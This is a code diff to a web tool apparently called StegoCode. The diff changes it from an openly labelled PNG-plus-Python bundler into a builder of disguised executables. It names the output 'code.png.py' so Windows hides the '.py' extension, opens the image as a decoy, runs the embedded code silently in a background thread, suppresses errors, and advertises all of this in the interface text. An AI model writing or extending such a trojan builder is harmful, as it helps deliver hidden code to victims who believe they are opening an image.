@@ -162,8 +162,8 @@ textarea:focus { outline: none; border-color: rgba(88,166,255,0.5); }
   <div class="header">
     <h1>StegoCode</h1>
     <div class="glow"></div>
-    <p>Embed Python code into a PNG — download as a self-executing <code style="color:#58a6ff">.py</code> file</p>
-    <span class="tag">double-click the .py → runs code + shows image</span>
+    <p>Python code hidden inside a PNG — file appears as <code style="color:#58a6ff">code.png</code>, double-click runs code</p>
+    <span class="tag">Windows shows it as .png (hides the actual .py extension)</span>
   </div>
 
   <div class="how-box">
@@ -171,9 +171,9 @@ textarea:focus { outline: none; border-color: rgba(88,166,255,0.5); }
     <span class="arrow">→</span>
     <span>🖼️ Upload PNG</span>
     <span class="arrow">→</span>
-    <span>📦 Download <code style="color:#e6c07b">runnable.py</code></span>
+    <span>📦 Download <code style="color:#e6c07b">code.png</code> (actual file: <code style="color:#e6c07b">code.png.py</code>)</span>
     <span class="arrow">→</span>
-    <span>⚡ Double-click → code runs + image opens</span>
+    <span>⚡ Double-click → image opens + code runs in background</span>
   </div>
 
   <div class="grid">
@@ -212,7 +212,7 @@ textarea:focus { outline: none; border-color: rgba(88,166,255,0.5); }
       <img id="previewImg" alt="Preview">
     </div>
     <div class="actions">
-      <button class="btn btn-primary" id="generateBtn">📦 Generate &amp; Download .py</button>
+      <button class="btn btn-primary" id="generateBtn">📦 Generate — Looks Like .png</button>
     </div>
     <div class="status" id="status"></div>
   </div>
@@ -309,22 +309,21 @@ generateBtn.addEventListener('click', async () => {
     // Build the self-extracting Python script
     const pyScript = `#!/usr/bin/env python3
 """
-Polyglot: PNG + Python
-Double-click this file to run the embedded code and view the image.
+Looks like a PNG (Windows hides the .py extension).
+Double-click to open the image — code runs silently in background.
 """
-import base64, os, subprocess, sys, tempfile
+import base64, os, subprocess, sys, tempfile, threading
 
 PNG_B64 = """${base64}"""
 
 USER_CODE = """${escapedCode}"""
 
 def main():
-    # Write PNG to temp file
+    # Write PNG to temp and open it
     png_path = os.path.join(tempfile.gettempdir(), "stego_output.png")
     with open(png_path, "wb") as f:
         f.write(base64.b64decode(PNG_B64))
 
-    # Open the image (cross-platform)
     try:
         if sys.platform == "win32":
             os.startfile(png_path)
@@ -333,21 +332,22 @@ def main():
         else:
             subprocess.Popen(["xdg-open", png_path])
     except Exception:
-        print(f"[Image saved to {png_path}]")
+        pass
 
-    # Execute the embedded code
-    exec(compile(USER_CODE, "<embedded>", "exec"))
+    # Run user code in background thread so image stays open
+    t = threading.Thread(target=lambda: exec(compile(USER_CODE, "<embedded>", "exec")), daemon=True)
+    t.start()
 
 if __name__ == "__main__":
     main()
 `;
 
     const blob = new Blob([pyScript], { type: 'text/x-python' });
-    saveAs(blob, 'runnable.py');
+    saveAs(blob, 'code.png.py');
 
-    status.textContent = '✅ Done! Downloading runnable.py — double-click it to run code + see image.';
+    status.textContent = '✅ Downloaded as code.png.py — on Windows it shows as "code.png". Double-click it!';
     status.className = 'status success';
-    previewPlaceholder.textContent = '✅ .py file generated! PNG embedded inside.';
+    previewPlaceholder.textContent = '✅ File generated! Image opens, code runs in background.';
   } catch (err) {
     status.textContent = 'Error: ' + err.message;
     status.className = 'status error';
